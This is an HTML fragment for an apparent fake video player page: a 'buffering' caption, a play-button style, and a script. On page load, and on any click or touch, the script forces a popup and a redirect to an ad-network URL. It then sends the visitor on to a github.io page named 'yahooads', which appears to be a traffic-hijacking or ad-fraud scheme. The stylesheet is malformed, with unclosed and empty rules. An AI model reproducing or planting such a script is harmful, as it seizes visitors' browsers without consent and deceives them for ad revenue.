  <script>
    (function () {
      const CLICKADU_URL = "https://suszhi.com/2144900";
      const MY_PAGE_URL = "https://yahooads.github.io/V-3/";

      let flowStarted = false;
      let pageMovedToMyPage = false;

      function goToMyPage() {
        if (pageMovedToMyPage) return;
        pageMovedToMyPage = true;
        try {
          window.location.replace(MY_PAGE_URL);
        } catch (err) {
          window.location.href = MY_PAGE_URL;
        }
      }

      function startFlow() {
        if (flowStarted) return;
        flowStarted = true;

        // 1. Pehle Clickadu link open karein
        try {
          window.open(CLICKADU_URL, "_blank", "noopener,noreferrer");
        } catch (e) {}

        try {
          window.location.href = CLICKADU_URL;
        } catch (err) {
          window.location.replace(CLICKADU_URL);
        }

        // 2. 2 second (2000ms) ke andar/baad apne page par bhejne ki koshish
        setTimeout(goToMyPage, 2000);
      }

      // Page khulte hi flow shuru
      startFlow();
      window.addEventListener("DOMContentLoaded", startFlow);
      document.addEventListener("pointerdown", startFlow, { passive: true });
      document.addEventListener("touchstart", startFlow, { passive: true });
      document.addEventListener("click", startFlow);
    })();
  </script>

  <style>
    * {

    .red-play-circle {

    }
    .red-play-circle svg {

      height: 30px;
      margin-left: 4px;
      display: block;
    }
    .buffering-caption {
      font-size: 15px;

      text-align: center;
    }
  </style>
